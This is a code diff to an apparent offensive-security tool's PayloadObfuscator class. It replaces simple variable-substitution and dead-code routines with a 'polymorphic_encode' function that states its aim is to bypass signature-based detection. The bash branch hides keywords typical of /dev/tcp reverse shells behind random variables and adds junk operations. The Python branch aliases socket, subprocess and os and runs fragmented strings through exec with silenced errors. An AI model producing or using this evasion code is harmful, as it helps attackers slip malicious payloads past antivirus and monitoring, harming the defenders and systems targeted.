@@ -588,82 +588,86 @@ class PayloadObfuscator:
         return ' + '.join(f'"{chunk}"' for chunk in chunks)
     
     @staticmethod
-    def variable_substitution(payload: str) -> str:
+    def polymorphic_encode(payload: str, language: str = "bash") -> str:
         """
-        Replace common strings with variables.
-        
-        Args:
-            payload: Original payload
-            
-        Returns:
-            Payload with variable substitutions
+        Advanced Polymorphic Encoding Engine.
+        Changes code structure every time to bypass signature-based detection.
         """
         import random
         import string
-        
-        substitutions = {
-            'bash': ''.join(random.choices(string.ascii_lowercase, k=4)),
-            '/bin/sh': ''.join(random.choices(string.ascii_lowercase, k=5)),
-            'powershell': ''.join(random.choices(string.ascii_lowercase, k=6)),
-            'cmd': ''.join(random.choices(string.ascii_lowercase, k=3)),
-        }
-        
-        var_defs = []
-        result = payload
-        
-        for original, var_name in substitutions.items():
-            if original in payload:
-                var_defs.append(f'{var_name}="{original}"')
-                result = result.replace(original, f'${var_name}')
-        
-        if var_defs:
-            return '\n'.join(var_defs) + '\n' + result
-        return result
-    
-    @staticmethod
-    def dead_code_injection(payload: str, language: str = "bash") -> str:
-        """
-        Inject dead code to confuse analysis.
-        
-        Args:
-            payload: Original payload
-            language: Target language
+
+        def random_var(length=5):
+            return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+        if language == "bash":
+            # 1. Decomposition: Split command into chars and mix variables
+            var_map = {}
+            parts = []
             
-        Returns:
-            Payload with dead code
-        """
-        import random
-        
-        dead_code = {
-            "bash": [
-                "# Random comment {}".format(random.randint(1000, 9999)),
-                "true",
-                ": '$(date)'",
-                "echo '' > /dev/null",
-            ],
-            "python": [
-                "# Comment {}".format(random.randint(1000, 9999)),
-                "_ = None",
-                "pass",
-                "0 if False else None",
-            ],
-            "powershell": [
-                "# Comment {}".format(random.randint(1000, 9999)),
-                "$null = $null",
-                "if ($false) { }",
+            # Create random variables for critical keywords
+            keywords = ["bash", "dev", "tcp", "sh"]
+            repo = []
+            
+            for word in keywords:
+                if word in payload:
+                    vname = random_var()
+                    var_map[word] = vname
+                    repo.append(f"{vname}='{word}'")
+            
+            # Reassemble with variable references
+            mutated = payload
+            for k, v in var_map.items():
+                mutated = mutated.replace(k, f"${v}")
+            
+            # 2. Junk Code Injection (Logic Preserving)
+            junk_ops = [
+                "true", 
+                ":", 
+                f"{random_var()}={random.randint(1,99)}",
+                "if [ 1 -eq 1 ]; then :; fi"
             ]
-        }
-        
-        dead = dead_code.get(language, dead_code["bash"])
-        lines = payload.split('\n')
-        result = []
-        
-        for line in lines:
-            result.append(line)
-            if random.random() > 0.5:
-                result.append(random.choice(dead))
-        
-        return '\n'.join(result)
+            
+            final_code = []
+            final_code.extend(repo)
+            final_code.append(random.choice(junk_ops))
+            final_code.append(mutated)
+            
+            return "; ".join(final_code)
+
+        elif language == "python":
+            # Python AST-level mutation simulation
+            imports = ["socket", "subprocess", "os"]
+            
+            # Random alias for imports
+            import_block = []
+            alias_map = {}
+            for imp in imports:
+                alias = random_var(3)
+                alias_map[imp] = alias
+                import_block.append(f"import {imp} as {alias}")
+            
+            mutated = payload
+            for org, alias in alias_map.items():
+                mutated = mutated.replace(org, alias)
+            
+            # String fragmentation
+            def fragment_string(s):
+                if len(s) < 5: return f"'{s}'"
+                cut = random.randint(1, len(s)-1)
+                return f"'{s[:cut]}'+'{s[cut:]}'"
+
+            # Reconstruct
+            wrapper = f"""
+try:
+    {";".join(import_block)}
+    exec({fragment_string(mutated)})
+except: pass
+"""
+            return wrapper.strip()
+
+        return payload  # Fallback for unknown langs
+    
+
 
 
 class PowerShellObfuscator:
